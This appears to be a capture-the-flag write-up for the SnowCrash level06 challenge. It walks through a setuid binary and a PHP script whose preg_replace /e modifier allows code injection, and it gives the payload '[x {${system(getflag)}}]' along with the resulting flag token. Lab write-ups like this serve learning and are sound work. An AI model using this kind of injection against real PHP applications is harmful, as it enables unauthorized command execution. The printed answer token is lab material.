Listing the files in the directory, we find a binary file and a php script:

```bash
level06@SnowCrash:~$ ls -la
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x--- 1 flag06 level06 356 Mar 5  2015 level06.php
```

The s in level06 permissions indicates the SetUID bit. This means the file will run with the privileges of its owner instead of the user executing it. In our case, the owner is flag06.

### **Analyzing level06 binary file**

```bash
level06@SnowCrash:~$ file level06
level06: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs)
```

To analyze the binary file, we transfer it to our local machine using **scp**:

```bash
level06@SnowCrash:~$ scp -P 4242 level06@127.0.0.1:/home/user/level06/level06 ./
```

We decompile the binary using [dogbolt.org](http://dogbolt.org) 

The script calls **getegid()** and **geteuid()** to retrieve the effective group ID and user ID, and then uses **setresgid()** and **setresuid()** to set them. In our case, these correspond to the **flag06** IDs.

### **Analyzing level06.php**

```php
#!/usr/bin/php
<?php
function y($m) {
	$m = preg_replace("/\./", " x ", $m);
	$m = preg_replace("/@/", " y", $m);
	return $m;
}

function x($y, $z) { 
	$a = file_get_contents($y);
	$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
	$a = preg_replace("/\[/", "(", $a);
	$a = preg_replace("/\]/", ")", $a);
	return $a; 
}

$r = x($argv[1], $argv[2]);
print $r;
?>
```

**The y() function**

Input: 

- $m → a string

Behavior: 

- Replace . by “ x ” in $m
- Replace @ by “ y” in $m

Return $m

**The x() function**

Input : 

- $y → a path to a file
- $z → unused

Behavior:

- Get the content of the file and stores it in $a
- Replace [ by ( in $a
- Replace ] by ) in $a
- Replaces [x something] with the result of y(”something”)

Return $a

**Regex explanations**

| PHP | Meaning |
| --- | --- |
| preg_replace() | Search and replace |
| preg_replace("/\./", " x ", $m) | Replace . by ” x “ in $m |
| preg_replace("/@/", " y", $m) | Replace @ by “ y” in $m |
| preg_replace("/\[/", "(", $a) | Replace [ by ( in $a |
| preg_replace("/\]/", ")", $a) | Replace ] by ) in $a |
| preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a) | Replaces [x something] with the result of y(”something”) |

Detailed explanation of **preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a)** : 

| Regex | Meaning |
| --- | --- |
| \[x | Matches [x literally |
| (.*) | Nested capture inside Group 1. Captures everything after [x **as Group 2** |
| \] | Matches ] literally |
| **(\[x (.*)\])** | This captures everything from [x …. ] including the brackets as Group 1 |
| /e | Modifier, evaluates the replacement as PHP code |
| **/(\[x (.*)\])/e** | Matches [x something], captures “something” in group 2 and evaluates y(\"\\2\") as PHP code (deprecated for security reason) |

**Exemple:**

**The problem with /e**

/e is a modifier deprecated for security reasons. It is used to evaluate the replacement string as PHP code. 

Normally, preg_replace($pattern, $replacement, $subject) just replaces text, but with /e the replacement part is executed as PHP code. 

**There is a security risk of code injection. To perform an injection in this context means to change the $subject variable.**

In our case $subject is passed through command-line as a file.

First, as we did in previous levels, we create a file into /tmp/ to save the result and set the appropriate permissions so the PHP injection script can write to it.

```bash
level06@SnowCrash:~$ touch /tmp/my_dir/script
level06@SnowCrash:~$ chmod 777 /tmp/my_dir/script
level06@SnowCrash:~$ echo '[x {${system(getflag)}}]' > script
```

Running the script:

```bash
level06@SnowCrash:~$ ./level06 script
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
Check flag.Here is your token : **wiok45aaoguiboiki2tuin6ub**
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
```
